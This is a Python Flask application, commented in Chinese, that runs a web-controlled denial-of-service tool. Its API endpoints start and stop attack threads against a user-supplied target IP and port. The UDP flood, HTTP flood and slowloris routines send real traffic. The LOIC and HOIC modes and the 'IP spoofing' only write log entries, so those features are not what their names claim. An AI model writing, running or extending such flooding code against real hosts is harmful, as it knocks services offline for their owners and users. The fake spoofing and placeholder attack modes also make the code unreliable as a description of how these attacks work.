from flask import Flask, request, jsonify
from flask_cors import CORS
import threading
import time
import random
import logging
import socket
import requests

app = Flask(__name__)
CORS(app)

# 日志配置
log_file = 'attack_log.txt'
logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s', handlers=[logging.FileHandler(log_file, 'a', 'utf-8'), logging.StreamHandler()])
logger = logging.getLogger()

# 全局变量
attack_log = []
attack_threads = {}
log_lock = threading.Lock()

# 伪造IP地址的逻辑
def spoof_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

# 模拟发送数据包
def send_packet(target_ip, port, data):
    spoofed_ip = spoof_ip()
    message = f"向 {target_ip}:{port}\n发送 '{data}'(伪IP: {spoofed_ip})\n"
    with log_lock:
        logger.info(message)
        attack_log.append(message)

def udp_flood(target_ip, port, duration, frequency, stop_event):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = b'X' * 1024  # 1KB大小的数据包
    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        client.sendto(message, (target_ip, port))
        send_packet(target_ip, port, 'UDP Flood')
        time.sleep(1 / frequency)


def http_flood(target_url, request_method, duration, frequency, stop_event):
    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        try:
            if request_method == 'GET':
                requests.get(target_url)
            elif request_method == 'POST':
                requests.post(target_url, data={'key': 'value'})
            send_packet(target_url, 80 if request_method == 'GET' else 443, 'HTTP Flood')
            time.sleep(1 / frequency)
        except requests.RequestException as e:
            with log_lock:
                logger.error(f"HTTP Flood 出错: {e}")
                attack_log.append(f"HTTP Flood 出错: {e}")
            stop_event.set()
            break

def slowloris(target_ip, port, duration, frequency, stop_event):
    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((target_ip, port))
            client.send(b'X-a: b\r\n')
            send_packet(target_ip, port, 'Slowloris')
            time.sleep(1 / frequency)
        except socket.error as e:
            with log_lock:
                logger.error(f"Slowloris 出错: {e}")
                attack_log.append(f"Slowloris 出错: {e}")
            stop_event.set()
            break

def loic(target_ip, port, duration, frequency, stop_event):
    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        send_packet(target_ip, port, 'LOIC')
        time.sleep(1 / frequency)

def hoic(target_ip, port, duration, frequency, stop_event):
    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        send_packet(target_ip, port, 'HOIC')
        time.sleep(1 / frequency)

def perform_attack(target_ip, port, attack_mode, request_method, request_frequency, duration, attack_duration, duration_unit, stop_event):
    try:
        # 生成或获取伪装IP
        fake_ip = spoof_ip()

        if attack_duration:
            attack_duration = float(attack_duration)  # 确保攻击持续时间为浮点数
            if duration_unit == 'seconds':
                duration = attack_duration
            elif duration_unit == 'minutes':
                duration = attack_duration * 60
            elif duration_unit == 'count':
                duration = attack_duration / request_frequency

        server_response = None
        if attack_mode == 'udp-flood':
            server_response = udp_flood(target_ip, port, duration, request_frequency, stop_event)
        elif attack_mode == 'http-flood':
            server_response = http_flood(target_ip, request_method, duration, request_frequency, stop_event)
        elif attack_mode == 'slowloris':
            server_response = slowloris(target_ip, port, duration, request_frequency, stop_event)
        elif attack_mode == 'loic':
            server_response = loic(target_ip, port, duration, request_frequency, stop_event)
        elif attack_mode == 'hoic':
            server_response = hoic(target_ip, port, duration, request_frequency, stop_event)

    except Exception as e:
        with log_lock:
            logger.error(f"攻击执行过程中出错: {e}")
            attack_log.append(f"攻击执行过程中出错: {e}")
        stop_event.set()

@app.route('/start-attack', methods=['POST'])
def start_attack():
    global attack_log, attack_threads
    attack_log = []  # 重置日志
    try:
        data = request.json
        logger.info(f"收到请求数据: {data}")
        target_ip = data['targetIp']
        port = int(data['port'])
        attack_mode = data['attackMode']
        request_method = data['requestMethod']
        request_frequency = int(data['requestFrequency'])
        time_unit = data['timeUnit']
        attack_duration = data.get('attackDuration')
        duration_unit = data.get('durationUnit')

        duration = 60 if time_unit == 'seconds' else 3600
        stop_event = threading.Event()

        attack_thread = threading.Thread(target=perform_attack, args=(target_ip, port, attack_mode, request_method, request_frequency, duration, attack_duration, duration_unit, stop_event))
        attack_thread.start()

        attack_threads[target_ip] = (attack_thread, stop_event)

        response = {
            'status': '攻击已开始',
            'log': f'攻击目标: {target_ip}, 端口: {port}, 模式: {attack_mode}, 请求方法: {request_method}, 请求次数: {request_frequency}, 时间单位: {time_unit}'
        }
    except Exception as e:
        logger.error(f"启动攻击时出错: {e}")
        attack_log.append(f"启动攻击时出错: {e}")
        response = {
            'status': '攻击启动失败',
            'log': f'启动攻击时出错: {e}'
        }
    return jsonify(response)

@app.route('/stop-attack', methods=['POST'])
def stop_attack():
    global attack_threads
    data = request.json
    target_ip = data['targetIp']

    if target_ip in attack_threads:
        attack_thread, stop_event = attack_threads[target_ip]
        stop_event.set()
        attack_thread.join()
        del attack_threads[target_ip]

    response = {'status': '攻击已停止'}
    return jsonify(response)

@app.route('/attack-log', methods=['GET'])
def get_attack_log():
    global attack_log
    with log_lock:
        logs = attack_log.copy()
    result = jsonify({'log': logs})
    print(result)  # 打印结果
    return result

if __name__ == '__main__':
    app.run(debug=True)
